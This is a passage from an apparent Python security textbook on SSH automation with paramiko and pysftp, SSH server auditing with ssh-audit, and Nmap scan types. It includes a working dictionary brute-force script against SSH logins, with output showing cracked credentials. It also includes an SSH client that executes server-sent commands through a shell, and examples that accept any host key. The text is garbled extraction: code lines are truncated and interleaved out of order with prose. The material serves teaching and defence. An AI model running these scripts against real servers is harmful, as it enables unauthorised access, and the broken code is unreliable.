This module depends on the pycrypto and cryptography libraries
for all encryption operations and allows the creation of local, remote,
and dynamic encrypted tunnels.
Among the main advantages of the paramiko module, we can
highlight the following:

It encapsulates the diﬃculties involved in performing
automated scripts against SSH servers in a comfortable and
easy-to-understand way for any developer.
It supports the SSH2 protocol through the pycrypto and
cryptography modules, for implementing details related to
public and private key cryptography.
It allows authentication by public key, authentication by
password, and the creation of SSH tunnels.
It allows us to write robust SSH clients with the same
functionality as other SSH clients such as PuTTY or the
OpenSSH client.
It supports ﬁle transfer safely using the SFTP protocol.
You can install paramiko directly from the pip Python repository
with the following command:
$ pip3 install paramiko 
You can install it in Python version 3.4+, and there are some
dependencies that must be installed on your system, such as the
pycrypto and cryptography modules, depending on what version
you are going to install. These libraries provide low-level, C-based
encryption algorithms for the SSH protocol. The installation details
for the cryptography module can be found at
https://cryptography.io/en/latest/installation.

Establishing an SSH connection with
paramiko
We can use the paramiko module to create an SSH client and then
connect it to the SSH server. This module provides the SSHClient()
class, which represents an interface to initiate server connections in a
secure way. These instructions will create a new SSHClient
instance, and connect to the SSH server by calling the connect()
method using as arguments username and password credentials:
By default, the SSHClient instance of this client class will refuse to
connect to a host that does not have a key saved in your
known_hosts ﬁle. With the AutoAddPolicy() class, you can set up
a policy for accepting unknown host keys. To do this, you need to
execute the set_missing_host_key_policy() method along with
the following argument on the ssh_client object.
Parsing an instance of AutoAddPolicy() to this method gives you a
way to trust all key policies:
>>> import paramiko 
>>> ssh_client = paramiko.SSHClient() 
>>> ssh_client.connect('host',username='username', p
>>> ssh_client.set_missing_host_key_policy(paramiko

With the previous instruction, paramiko automatically adds the
remote server ﬁngerprint to the host ﬁle of the operating system.
Now, since we are performing automation, we will inform
paramiko to accept these keys the ﬁrst time without interrupting the
session or prompting the user for them. If you need to restrict
accepting connections only to speciﬁc hosts, then you can use the
load_system_host_keys() method to add the system host keys
and system ﬁngerprints:
>>> ssh_client.load_system_host_keys() 
You can ﬁnd the following code in the paramiko_test.py ﬁle,
located in the paramiko folder in the GitHub repository:
import paramiko 
import socket 
#put data about your ssh server 
host = 'localhost' 
username = 'username' 
password = 'password'
try: 
    ssh_client = paramiko.SSHClient() 
    paramiko.common.logging.basicConfig(level=parami
    #The following lines add the server key automati
    ssh_client.load_system_host_keys() 
    ssh_client.set_missing_host_key_policy(paramiko
    response = ssh_client.connect(host, port = 22, u
    print('connected with host on port 22',response)
    security_options = transport.get_security_option

In the previous script, we are testing the connection with the
localhost server deﬁned in the host variable. However, this is not
the end.
In the following code, we are managing paramiko exceptions
related to the connection with the SSH server and other exceptions
related to socket connections with the server:
If a connection error occurs, the appropriate exception will be
thrown depending on whether the host does not exist, or the
credentials are incorrect. In the following output, we can see the
OpenSSH version we are using to connect with the SSH server and
information about cipher algorithms supported by the server:
    print(security_options.kex) 
    print(security_options.ciphers) 
except paramiko.BadAuthenticationType as exception: 
    print("BadAuthenticationException:",exception) 
except paramiko.SSHException as sshException: 
    print("SSHException:",sshException) 
except socket.error as  socketError: 
    print("socketError:",socketError) 
finally: 
    print("closing connection") 
    ssh_client.close() 

If the connection is successful, then it shows information related to
the SSH server and the supported encryption algorithms.
One of the most important points to keep in mind is to
establish the default policy for locating the host key on
the client’s computer. Otherwise, if the host key is not
found (usually located in the /.ssh/know_hosts ﬁle),
Python will throw the following paramiko exception:
raise SSHException('Unknown server %s' %
hostname) paramiko.SSHException: Unknown
server.
$ python paramiko_test.py 
DEBUG:paramiko.transport:starting thread (client mod
DEBUG:paramiko.transport:Local version/idstring: SSH
DEBUG:paramiko.transport:Remote version/idstring: SS
INFO:paramiko.transport:Connected (version 2.0, clie
DEBUG:paramiko.transport:kex algos:['sntrup761x25519
DEBUG:paramiko.transport:Kex agreed: curve25519-sha2
DEBUG:paramiko.transport:HostKey agreed: ssh-ed25519
DEBUG:paramiko.transport:Cipher agreed: aes128-ctr 
DEBUG:paramiko.transport:MAC agreed: hmac-sha2-256 
DEBUG:paramiko.transport:Compression agreed: none 
DEBUG:paramiko.transport:kex engine KexCurve25519 sp
DEBUG:paramiko.transport:Switch to new keys ... 
DEBUG:paramiko.transport:Trying SSH agent key b'f09a
... 

paramiko allows the user to be validated both by password and by
key pair, making it ideal for authenticating users beyond server
policies. When you connect with an SSH server for the ﬁrst time, if
the SSH server keys are not stored on the client side, you will get a
warning message saying that the server keys are not cached in the
system and will be prompted as to whether you want to accept those
keys.
Using AutoAddPolicy
Paramiko requires validating the trust relationship with the
machine we are establishing an SSH connection to. This validation is
done through the set_missing_host_key_policy() method. By
default, the paramiko.SSHclient object sets the policy to
RejectPolicy. However, using this method, we could set the policy
to TrustAll. Parsing an AutoAddPolicy instance for
set_missing_host_key_policy() changes it to allow any host:
In the same way that we can connect to an SSH server and execute
any command on the server if we have the appropriate permissions,
we could also implement functionalities such as downloading a ﬁle
in a secure way.
>>> import paramiko 
>>> data = dict(hostname=HOST, port=PORT, username=U
>>> ssh_client = paramiko.SSHClient() 
>>> ssh_client.set_missing_host_key_policy(paramiko
>>> ssh_client.connect(**data) 

In the following example, the SFTP_Connection class contains the
__init__ method, which allows us to initialize the host name or IP
address, username, and password aĴributes with default values, and
the connect() method, which makes the connection to the server.
You can ﬁnd the following code in the SFTP_paramiko.py ﬁle,
located in the paramiko folder in the GitHub repository:
import paramiko 
import getpass 
class SFTP_Connection: 
    def __init__(self): 
        self.HOST = 'localhost' 
        self.USERNAME = 'linux' 
        self.PASSWORD = '' 
    def connect(self): 
        try: 
            self.PASSWORD = getpass.getpass() 
        except Exception as exception: 
            print('Exception:',exception) 
        client = paramiko.SSHClient() 
        client.set_missing_host_key_policy(paramiko
        client.load_system_host_keys() 
        client.connect(hostname = self.HOST , userna
        sftp = client.open_sftp() 
        print(sftp) 
        dirlist = sftp.listdir('.') 
        print("Directory list:",dirlist) 
        sftp.chdir('/etc/') 
        sftp.get('hosts','my_hosts_file') 
        sftp.close() 

In the previous code, we are creating a paramiko.SSHClient()
handler to make the connection, which we assign to the client
variable, and later we assign to the sftp variable a
client.open_sftp() handler to manage the sftp connection.
With the listdir() method, we get a directory listing and with the
chdir() method, we change the server directory. At this point, it’s
important to mention that you will need to modify username and
password seĴings in the __init__() method depending on your
OS:
When executing the previous script, we list ﬁles in the current
directory, download the hosts ﬁle located in the /etc/ folder, and
save it on our computer as my_hosts_file.
Running commands with paramiko
Now we are connected to the remote host with paramiko, we can
execute commands on the remote host using this connection. To run
        client.close() 
if __name__ == '__main__': 
    ssh = SFTP_Connection() 
    ssh.connect() 
$ python SFTP_paramiko.py 
Password:  
<paramiko.sftp_client.SFTPClient object at 0x7fb08c4
Directory list: ['.cache', '.maltego', '.scala_histo

any command on the target host, we need to invoke the
exec_command() method by passing the command as its argument:
The following example shows how to establish an SSH connection to
a target host and then run a command entered by the user. To
execute the command, we are using the exec_command() method of
the ssh_session object that we obtained from the open session
when logging into the server. You can ﬁnd the following code in the
ssh_execute_command.py ﬁle, located in the paramiko folder in
the GitHub repository:
>>> ssh_client.connect(hostname, port, username, pas
>>> stdin, stdout, stderr = ssh_client.exec_command(
>>> for line in stdout.readlines(): 
>>>   print(line.strip()) 
>>> ssh_client.close() 
import getpass 
import paramiko 
HOSTNAME = 'localhost' 
PORT = 22
def run_ssh_cmd(username, password, command, hostnam
    ssh_client = paramiko.SSHClient() 
    ssh_client.set_missing_host_key_policy(paramiko
    ssh_client.load_system_host_keys() 
    ssh_client.connect(hostname, port, username, pas
    stdin, stdout, stderr = ssh_client.exec_command(
    #print(stdout.read()) 
    stdin.close() 

In the previous script, we are creating a function called
run_ssh_cmd(), which makes a connection to an SSH server and
runs a command entered by the user.
Another way to connect to an SSH server is through the
Transport() method, which accepts as a parameter the IP address
to connect to and provides another type of object to authenticate
against the server. In the following example, we perform the same
functionality as in the previous script, but in this case, we use the
Transport class to establish a connection with the SSH server. You
can ﬁnd the following code in the SSH_command_transport.py ﬁle,
located in the paramiko folder in the GitHub repository:
    for line in stdout.read().splitlines(): 
        print(line.decode()) 
if __name__ == '__main__': 
    hostname = input("Enter the target hostname: ") 
    port = input("Enter the target port: ") 
    username = input("Enter username: ") 
    password = getpass.getpass(prompt="Enter passwor
    command = input("Enter command: ") 
    run_ssh_cmd(username, password, command) 
import paramiko 
import getpass 
def run_ssh_command(hostname, user, passwd, command)
    transport = paramiko.Transport(hostname) 
    try: 
        transport.start_client() 
    except Exception as exception: 

In the previous code, the start_client() method allows us to
open a new session for execution commands and the
auth_password() method is used to authenticate the username and
password.
When executing the previous script, we can see information for
authentication in the server and the result of executing the whoami
command, which returns the authenticated user:
$ python SSH_command_transport.py 
Enter the target hostname: localhost 
        print(exception) 
    try: 
        transport.auth_password(username=user,passwo
    except Exception as exception: 
        print(exception) 
    if transport.is_authenticated(): 
        print(transport.getpeername()) 
        channel = transport.open_session() 
        channel.exec_command(command) 
        response = channel.recv(1024) 
        print('Command %r(%r)-->%s' % (command,user,
if __name__ == '__main__': 
    hostname = input("Enter the target hostname: ") 
    port = input("Enter the target port: ") 
    username = input("Enter username: ") 
    password = getpass.getpass(prompt="Enter passwor
    command = input("Enter command: ") 
    run_ssh_command(hostname,username, password, com

Enter the target port: 22 
Enter username: linux 
Enter password:  
Enter command: whoami 
('::1', 22, 0, 0) 
Command 'whoami'('linux')-->b'linux\n' 
Using paramiko to brute-force SSH
user credentials
In the same way that we implemented a script for checking
credentials with FTP servers, we could implement another one for
checking whether an SSH server is vulnerable to a brute-force aĴack
using a dictionary.
We could implement a method that takes two ﬁles as inputs
(users.txt and passwords.txt) and through a brute-force
process, tries to test all the possible combinations of users and
passwords. When trying a combination of usernames and
passwords, if you can establish a connection, you could also execute
a command in the SSH server.
Note that if we get a connection error, we have an exception block
where we can perform diﬀerent error management tasks, depending
on whether the connection failed due to an authentication error
(paramiko.AuthenticationException) or a connection error with
the server (socket.error).
The ﬁles related to usernames and passwords are simple ﬁles in
plaintext that contain common default usernames and passwords for

databases and operating systems. Examples of these ﬁles can be
found in the fuzzdb project: https://github.com/fuzzdb-
project/fuzzdb/tree/master/wordlists-user-passwd. With
the following script, we can execute an aĴack using a dictionary of
users and passwords against an SSH server. You can ﬁnd the
following code in the ssh_brute_force.py ﬁle:
In the previous code, we are implementing a method called
brute_force_ssh() that tries to establish a connection with the
SSH server for each user-password combination. Also, in this
method, we are using the
paramiko.util.log_to_file('paramiko.log') instruction to
import paramiko 
import socket 
import time 
def brute_force_ssh(hostname,port,user,password): 
    log = paramiko.util.log_to_file('log.log') 
    ssh_client = paramiko.SSHClient() 
    ssh_client.load_system_host_keys() 
    ssh_client.set_missing_host_key_policy(paramiko
    try: 
        print('Testing credentials {}:{}'.format(use
        ssh_client.connect(hostname,port=port,userna
        print('credentials ok {}:{}'.format(user,pas
    except paramiko.AuthenticationException as excep
        print('AuthenticationException:',exception) 
    except socket.error as error: 
        print('SocketError:',error) 

save all the activity that paramiko is registering when executing the
script:
In the previous code, we are implementing a brute-force process
where we are calling the brute_force_ssh() method and iterating
over the combination of users and passwords. When executing the
previous script, we can see how it tests diﬀerent combinations of
username and password until it has tried all the combinations that
we have in the ﬁles or ﬁnds the correct credentials:
$ python ssh_brute_force.py 
Enter the target hostname: localhost 
Enter the target port: 22 
Testing credentials user1:password1 
AuthenticationException: Authentication failed. 
Testing credentials user1:LINUX 
AuthenticationException: Authentication failed. 
def main(): 
    hostname = input("Enter the target hostname: ") 
    port = input("Enter the target port: ") 
    users = open('users.txt','r').readlines() 
    passwords = open('passwords.txt','r').readlines(
    for user in users: 
        for password in passwords: 
            time.sleep(3) 
            brute_force_ssh(hostname,port,user.rstri
if __name__ == '__main__': 
    main() 

Testing credentials linux:password1 
AuthenticationException: Authentication failed. 
Testing credentials linux:LINUX 
credentials ok linux:LINUX 
Next, we are going to use the pysftp module, which is based on
paramiko, to connect to an SSH server.
Establishing an SSH connection with
pysftp
pysftp is a wrapper around paramiko that supports remote SSH
interactions and ﬁle transfers. More details regarding this package
can be found in the PyPI repository:
https://pypi.org/project/pysftp. To install pysftp on your
environment with pip, run the following command:
$ python3 -m pip install pysftp 
In the following example, we are listing ﬁles from a speciﬁc
directory. You can ﬁnd the following code in the
testing_pysftp.py ﬁle inside the pysftp folder:
import pysftp 
import getpass 
HOSTNAME = 'localhost' 
PORT = 22
def sftp_getfiles(username, password, hostname=HOSTN

In the previous script, we are listing the content of a directory using
the listdir_attr() method. After establishing a connection with
the server, we are using the cwd() method to change to the root
directory, providing the path of the directory as the ﬁrst argument.
Using the with instruction, the connection closes automatically at
the end of the block and we don’t need to close the connection with
the server manually. This could be the output of the previous script:
    cnopts = pysftp.CnOpts(knownhosts='known_hosts')
    # Load the public SSH key into the known hosts f
    cnopts.hostkeys.load('/home/linux/.ssh/known_hos
    with pysftp.Connection(host=hostname, username=u
        print("Connection successfully established w
        sftp.cwd('/') 
        list_directory = sftp.listdir_attr() 
        for directory in list_directory: 
            print(directory.filename, directory) 
if __name__ == '__main__': 
    hostname = input("Enter the target hostname: ") 
    port = input("Enter the target port: ") 
    username = input("Enter your username: ") 
    password = getpass.getpass(prompt="Enter your pa
    sftp_getfiles(username, password, hostname, port
$ python testing_pysftp.py 
Enter the target hostname: localhost 
Enter the target port: 22 
Enter your username: linux 
Enter your password: 

Here, we can see how it returns all ﬁles in the remote directory after
requesting a data connection to the server on localhost.
Now that you know the basics about connecting and transferring
ﬁles from an SSH server with the paramiko and pysftp modules,
let’s move on to learning about how to implement an SSH server
with paramiko.
Implementing an SSH server with
paramiko
In the following example, we are going to use the paramiko library
to implement our own SSH server by encrypting traﬃc with the SSH
protocol. You can ﬁnd the following code in the SSH_Server.py ﬁle
inside the paramiko folder.
First, we review the code for the SSH server:
Connection successfully established with server... 
bin drwxr-xr-x   1 0        0           12288 27 Mar
boot drwxr-xr-x   1 0        0            4096 27 Ma
cdrom drwxrwxr-x   1 0        0            4096 26 M
dev drwxr-xr-x   1 0        0            4500 10 Jul
etc drwxr-xr-x   1 0        0           12288 09 Jul
home drwxr-xr-x   1 0        0            4096 27 Ma
… 
import socket, paramiko, threading, sys  
import getpass 

The paramiko package provides a class called ServerInterface,
which allows you to implement a basic SSH server. In the previous
code, we are implementing an authentication mechanism based on a
username and password embedded in the code within the
check_auth_password() method.
Next, the goal is to create a TCP server using the socket module
available in Python to accept connections from clients, and then
create a Paramiko Transport object to manage and encrypt that
TCP connection. The code would be the following:
if len(sys.argv) != 3:  
    print("usage SSH_Server.py <interface> <port>") 
    exit() 
class SSH_Server (paramiko.ServerInterface): 
    def check_channel_request(self, kind, chanid):  
        if kind == 'session':  
            return paramiko.OPEN_SUCCEEDED  
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY
    def check_auth_password(self, username, password
        if (username == 'linux') and (password == 'l
            return paramiko.AUTH_SUCCESSFUL 
        return paramiko.AUTH_FAILED 
try:  
    sock = socket.socket(socket.AF_INET, socket.SOCK
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REU
    sock.bind((sys.argv[1], int(sys.argv[2])))  
    sock.listen(100) 
    print('[+] Listening on port ',str(sys.argv[2]))

In the previous script, the RSA encryption key is located in the
/home/linux/.ssh/id_rsa directory. On the other hand, you can
see the Transport class is the one that actually takes care of starting
the SSH server using the start_server() method and then
establishing SSH connections with the client. This server will only
accept one incoming connection for simplicity, but if necessary, one
    client, addr = sock.accept() 
    print("Input connection") 
    transport = paramiko.Transport(client) 
    transport.load_server_moduli()  
    server_key = paramiko.RSAKey(filename='/home/lin
    key_password = getpass.getpass(prompt='Enter pas
    server_key.from_private_key_file('/home/linux/.s
    transport.add_server_key(server_key) 
    server = SSH_Server() 
    transport.start_server(server=server) 
    channel = transport.accept(20) 
    print((channel.recv(1024).decode()))  
    channel.send('SSH Connection Established!') 
    while True: 
        command= input(">: ").strip('n') 
        if command.lower() == 'exit': 
            print("Closing connection...") 
            channel.send('exit') 
            break 
        channel.send(command) 
        print((channel.recv(1024).decode())) 
except Exception as exception: 
    print(('[-] Excepción: ' + str(exception))) 

thread can be created for each client that tries to connect using the
threading module.
To create an SSH client, we could create an instance of the
SSHClient class and then establish the connection with the
connect() method. Finally, a channel is opened to be able to send
and receive packets using the SSH connection indeﬁnitely or until
the command from the server is exit. You can ﬁnd the following code
in the SSH_client.py ﬁle inside the paramiko folder:
import paramiko, threading, subprocess, getpass 
host = input("Host: ") 
port = input("Port: ") 
user = input("User: ") 
passwd = getpass.getpass("Password: ") 
client = paramiko.SSHClient()  
client.set_missing_host_key_policy(paramiko.AutoAddP
client.connect(host, username=user, password=passwd,
channel = client.get_transport().open_session()  
channel.send('Client: '+subprocess.check_output('hos
print(channel.recv(1024).decode())  
while True: 
    command = channel.recv(1024) 
    if command.lower() == 'exit': 
        print("Server exiting....") 
        break 
    try: 
        result = subprocess.check_output(command, sh
        channel.send(result) 
    except Exception as exception: 

When executing the SSH server, we indicate the interface and port
where the server will listen. Once a connection is established by the
client, we will be able to execute commands on this server, for
example, to see the user that has been authenticated or to obtain a
list of ﬁles that the server is exposing:
When executing the SSH client, we indicate the interface, port,
username and password that allow us to authenticate with the
        channel.send(str(exception)) 
client.close() 
$ sudo python SSH_Server.py localhost 22 
[+] Listening on port  22 
Input connection 
Enter password for RSA key file: 
Client: linux-hpelitebook8470p 
>: whoami 
linux 
>: pwd 
/home/linux/Downloads/Python-for-Security-and-Networ
>: ls 
paramiko_test.py 
SFTP_paramiko.py 
ssh brute force 
SSH_client.py 
SSH_command_transport.py 
ssh_execute_command.py 
SSH_Server.py 

server and establish the connection. Using the previous
conﬁguration, we could use Linux credentials for the username and
password:
$ python SSH_client.py 
Host: localhost 
Port: 22 
User: linux 
Password:  
SSH Connection Established! 
Now that you know the basics about implementing an SSH server
and SSH client with the paramiko module, let’s move on to learning
about how to check the security of the SSH server with the ssh-
audit and Rebex SSH check tools.
Checking the security of SSH
servers
If we need to verify our SSH server conﬁguration, we have two
choices:
By reviewing the SSH conﬁgurations ﬁle and comparing the
ﬁles against a benchmark such as the CIS
By using ssh-audit, which is a script developed in Python that
will allow us to extract a large amount of information about our
protocol conﬁguration

In this section, we will be looking at ssh-audit,
https://pypi.org/project/ssh-audit, an open source tool
wriĴen in Python that scans the SSH server conﬁgurations and will
indicate whether the diﬀerent conﬁgurations that we have applied
are secure. The main feature of this tool is that it can audit every part
of the SSH server. For example, it will be able to detect the login
banner and if we are using an insecure protocol such as SSH1.
At the communications encryption level, it has the capacity to verify
the key exchange algorithms, the public key of the host, the
symmetric encryption when the communication has already been
established, and authentication messages. Once you have analyzed
each of these parameters, you will get a complete report indicating
since when this option has been available, if it has been removed or
disabled, and if it is secure or not.
Installing and executing ssh-audit
The simplest and most direct way to install this tool is by using the
PyPI repository using the following command:
$ pip install ssh-audit 
If you are using a Debian-based Linux distribution, you can install
ssh-audit with the following command:
$ apt-get install ssh-audit 

Another way to install this tool is through the source code available
in the GitHub repository: https://github.com/jtesta/ssh-
audit. The fastest way to run the script and test your server is to run
it directly with Python and provide as a positional argument the
domain or IP address of the server to be analyzed:
$ python ssh-audit.py <domain> 
To use this tool from the command line, we can specify some
arguments, among which we can highlight:
-1, --ssh1: force ssh version 1
-2, --ssh2: force ssh version 2
-4, --ipv4: enables IPv4
-6, --ipv6: enable IPv6
-p, --port=<port>: port to connect to
-b, --batch: batch output
-v, --verbose: detailed output
-l, --level=<level>: minimum output level (info | warn |
fail)
We could analyze our localhost SSH server with the following
command:
$ ssh-audit.py -v localhost 
Also, we could audit an external domain server such as
scanme.namp.org as follows:

$ ssh-audit.py scanme.nmap.org  
In the following screenshots, we can see how the tool will mark the
output in diﬀerent colors when a certain algorithm is insecure, weak,
or secure:
Figure 7.1: Executing ssh-audit
In this way, we can quickly identify where we must stop to solve a
security issue with the server. Another feature that it provides is that
it allows us to show the version of SSH used based on the
information from the algorithms:

Figure 7.2: Executing ssh-audit
This script shows the following information in the output:
The version of the protocol and software that we are using
The key exchange algorithms
The host algorithms
The encryption algorithms
The message authentication algorithms (hash)
Recommendations on how to proceed with speciﬁc algorithms
The tool will mark in diﬀerent colors when a certain algorithm is
insecure, weak, or secure, so that we can quickly identify where we

must intervene to ﬁx it as soon as possible. In the report tool outputs,
we see how it shows the algorithms it is using along with those that
would be recommended for use:
In case we are interested in changing the default conﬁguration of the
server, we could do it through the conﬁguration ﬁle. For example,
we could change the default port and disable the server banner:
$ sudo nano /etc/ssh/sshd_config 
Port 12000 
PrintMotd no 
Banner /dev/null 
It is also important to consider the permissions of the conﬁguration
ﬁles to ensure the principle of least privilege is maintained:
# algorithm recommendations (for OpenSSH 7.2) 
(rec) -ecdh-sha2-nistp521                   -- kex a
(rec) -ecdh-sha2-nistp384                   -- kex a
(rec) -ecdh-sha2-nistp256                   -- kex a
(rec) -diffie-hellman-group14-sha1          -- kex a
(rec) -ecdsa-sha2-nistp256                  -- key a
(rec) -hmac-sha2-512                        -- mac a
(rec) -umac-128@openssh.com                 -- mac a
(rec) -hmac-sha2-256                        -- mac a
(rec) -umac-64@openssh.com                  -- mac a
(rec) -hmac-sha1                            -- mac a
(rec) -hmac-sha1-etm@openssh.com            -- mac a
(rec) -umac-64-etm@openssh.com              -- mac a

$ sudo chown -R root:root /etc/ssh 
$ sudo chmod 700 /etc/ssh 
$ sudo chmod 600 /etc/ssh/ssh_host_rsa_key 
$ sudo chmod 600 /etc/ssh/ssh_host_dsa_key 
$ sudo chmod 600 /etc/ssh/ssh_host_ecdsa_key 
$ sudo chmod 600 /etc/ssh/ssh_host_ed25519_key 
$ sudo chmod 644 /etc/ssh/ssh_host_rsa_key.pub 
$ sudo chmod 644 /etc/ssh/ssh_host_dsa_key.pub 
$ sudo chmod 644 /etc/ssh/ssh_host_ecdsa_key.pub 
$ sudo chmod 644 /etc/ssh/ssh_host_ed25519_key.pub 
$ sudo chmod 600 /etc/ssh/sshd_config 
Remember that for the changes to be reﬂected, we need to restart the
SSH server:
$ sudo service ssh restart 
Once SSH-Audit tool has been analyzed, we could analyze other
online tools that allow us to verify the security of SSH servers,
among which we can highlight the Rebex SSH Check tool.
Rebex SSH Check
Rebex SSH Check (https://sshcheck.com) is a service that allows
scanning the server key exchange algorithms and symmetric
encryption algorithms, as well as the MAC algorithms that we
currently have conﬁgured on the SSH server we are analyzing:

Figure 7.3: Executing Rebex SSH Check
In this section, we have analyzed how we can audit the security of
our SSH server using ssh-audit and other online tools such as
Rebex SSH check. By auditing our SSH server using these, we can
ensure that the security of our server is maintained.
Summary
One of the objectives of this chapter was to analyze the modules that
allow us to connect with FTP, SFTP, and SSH servers. In this chapter,

we came across several network protocols and Python libraries that
are used for interacting with remote systems. Finally, we reviewed
some tools for auditing SSH server security. From a security point of
view, by using the modules and tools we discussed in this chapter,
you are now well equipped to check the security level of a server to
minimize the exposure surface for a possible aĴacker.
In the next chapter, we will explore programming packages for
working with the Nmap scanner and obtain more information about
services and vulnerabilities that are running on servers.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. Which method from ftplib do we need to use to download
ﬁles and which FTP command do we need to execute?
2. Which method of the paramiko module allows us to connect to
an SSH server and with what parameters (host, username,
and/or password)?
3. Which method of the paramiko module allows us to open a
session to be able to execute commands subsequently?
4. What is the instruction for executing a command with
paramiko and what is the response format?
5. What is the instruction for informing paramiko to accept server
keys for the ﬁrst time without interrupting the session or
prompting the user?

Further reading
At the following links, you can ﬁnd more information about the
aforementioned tools and other tools related to extracting
information from web servers:
ftplib: https://docs.python.org/3/library/ftplib.html
paramiko: https://www.paramiko.org
pysftp:
https://pysftp.readthedocs.io/en/latest/pysftp.html
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

8
Working with Nmap Scanner
This chapter describes how to perform network scans using
python-nmap as a wrapper for Nmap to gather information about a
network, a host, and the services running on that host. python-nmap
provides a speciﬁc module to take more control of the process of
scanning a network to detect open ports and exposed services in
speciﬁc machines or servers.
The following topics will be covered in this chapter:
Introducing port scanning with Nmap
Port scanning with python-nmap
Synchronous and asynchronous scanning with python-nmap
Discovering services and vulnerabilities with Nmap scripts
Port scanning using online services
Technical requirements
To get the most out of this chapter, you will need to install a Python
distribution on your local machine and have some basic knowledge
about the HTTP protocol. We will work with Python version 3.10,
available at https://www.python.org/downloads.

The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Check out the following video to see the Code in Action:
https://packt.link/Chapter08.
This chapter requires the installation of the Nmap program in your
operating system and the python-nmap module. You can install
Nmap through the oﬃcial URL,
https://nmap.org/download.html. You can use your operating
system’s package management tool to install it. Here’s a quick guide
on how to on install this module in a Debian-based Linux operating
system with Python 3.10, using the following commands:
$ sudo apt-get install python3.10 
$ sudo apt-get install python3-setuptools 
$ sudo pip3.10 install python-nmap 
Introducing port scanning with
Nmap
Let’s begin by reviewing the Nmap tool for port scanning and the
main scanning types that it supports. In this ﬁrst section, we will
learn about Nmap as a port scanner that allows us to analyze ports
and services that run on a speciﬁc host.

Once you have identiﬁed diﬀerent hosts within your network, the
next step is to perform a port scan of each host identiﬁed. Computers
that support communication protocols use ports to make
connections between them. To support diﬀerent communications
with multiple applications, ports are used to distinguish between
various communications in the same host or server.
For example, web servers can use Hypertext Transfer Protocol
(HTTP) to provide access to a web page that uses TCP port number
80 by default. File Transfer Protocol (FTP) and Simple Mail
Transfer Protocol (SMTP) use ports 21 and 25 respectively.
For each unique IP address, a protocol port number is identiﬁed by a
16-bit number, commonly a number in the port range of 0-65,535.
The combination of a port number and IP address provides a
complete address for communication. Depending on the direction of
the communication, both a source and destination address (IP
address and port combination) are required.
Scanning types with nmap
Nmap is one of the most important projects in the world of
cybersecurity. This port scanner has become a Swiss Army Knife for
pentesting tasks. When a security researcher wants to check the
exposure of a target at the service level, they will almost always start
by performing a port scan to see which ports are open, which
operating system is being used, and even which version of a
particular service is being used.

Nmap is currently the best program to perform a scan of hosts
within a local network, although it also allows us to check whether a
given host with IPv4 or IPv6 is up and running.
From the https://nmap.org/download.html site, we can
download the latest version available of this tool, depending on the
operating system we’re using. If we execute the Nmap tool from the
console terminal, we can see all the options that it provides:
$ nmap 
Nmap 7.92 ( https://nmap.org ) 
Usage: nmap [Scan Type(s)] [Options] {target specifi
TARGET SPECIFICATION: 
  Can pass hostnames, IP addresses, networks, etc. 
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1
HOST DISCOVERY: 
  -sL: List Scan - simply list targets to scan 
  -sn: Ping Scan - disable port scan 
  -Pn: Treat all hosts as online -- skip host discov
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP d
  -PE/PP/PM: ICMP echo, timestamp, and netmask reque
SCAN TECHNIQUES: 
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maim
  -sU: UDP Scan 
  -sN/sF/sX: TCP Null, FIN, and Xmas scans 
  --scanflags <flags>: Customize TCP scan flags 
  -sI <zombie host[:probeport]>: Idle scan 
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans 
  -sO: IP protocol scan 
  -b <FTP relay host>: FTP bounce scan 

In the previous output, we can see the main scan techniques nmap
provides:
sT (TCP Connect Scan): This is the option usually used to
detect whether a port is open or closed. With this option, a port
is open if the server responds with a packet containing the ACK
ﬂag when sending a packet with the SYN ﬂag.
sS (TCP Stealth Scan): This is a type of scan based on the TCP
Connect Scan with the diﬀerence that the connection on the port
is not done completely. This option consists of checking the
response packet of the target before checking a packet with the
SYN ﬂag enabled. If the target responds with a packet that
contains the RST ﬂag, then you can check whether the port is
open or closed.
sU (UDP Scan): This is a type of scan based on the UDP
protocol where a UDP packet is sent to determine whether the
port is open. If the response is another UDP packet, it means
that the port is open. If the response returns an Internet Control
Message Protocol (ICMP) packet of type 3 (destination
unreachable), then the port is not open.
sA (TCP ACK Scan): This type of scan lets us know whether our
target machine has any type of ﬁrewall running. This scan
option sends a packet with the ACK ﬂag activated to the target
machine. If the remote machine responds with a packet where
the RST ﬂag is activated, it can be determined that the port is
not ﬁltered by any ﬁrewall. If we don’t get a response from the
remote machine, it can be determined that there is a ﬁrewall
ﬁltering the packets sent to the speciﬁed port.

sN (TCP NULL Scan): This is a type of scan that sends a TCP
packet to the target machine without any ﬂag. If the remote
machine returns a valid response, it can be determined that the
port is open. Otherwise, if the remote machine returns an RST
ﬂag, we can say the port is closed.
sF (TCP FIN Scan): This is a type of scan that sends a TCP
packet to the target machine with the FIN ﬂag. If the remote
machine returns a response, it can be determined that the port is
open. If the remote machine returns an RST ﬂag, we can say that
the port is closed.
sX (TCP XMAS Scan): This is a type of scan that sends a TCP
packet to the target machine with the ﬂag PSH, FIN, or URG. If
the remote machine returns a valid response, it can be
determined that the port is open. If the remote machine returns
an RST ﬂag, we can say that the port is closed. If we obtain an
ICMP type 3 packet in the response, then the port is ﬁltered.
The type of default scan can diﬀer depending on the user running it,
due to the permissions that allow the packets to be sent during the
scan. The diﬀerences between scanning types are the packets
returned from the target machine and their ability to avoid being
detected by security systems such as ﬁrewalls or detection systems
for intrusion.
For example, a command with the -sS (TCP SYN scan) option
requires executing nmap in a privileged way as this type of scan
requires raw socket/raw packet privileges. However, a command
with the -sT (TCP connect scan) option does not require raw sockets
and -nmap can be executed in an unprivileged way.

You can use the nmap -h option command or visit
https://nmap.org/book/man-port-scanning-
techniques.html to learn more about the port
scanning techniques supported by Nmap. Nmap also
provides a graphical interface known as Zenmap
(https://nmap.org/zenmap), which is a simpliﬁed
interface on the Nmap engine.
Nmap’s default behavior executes a port scan using a default port
list with common ports used. For each of the ports, it returns
information about the port state and the service that is running on
that port. At this point, Nmap categorizes ports into the following
states:
Open: This state indicates that a service is listening for
connections on this port.
Closed: This indicates that there is no service running on this
port.
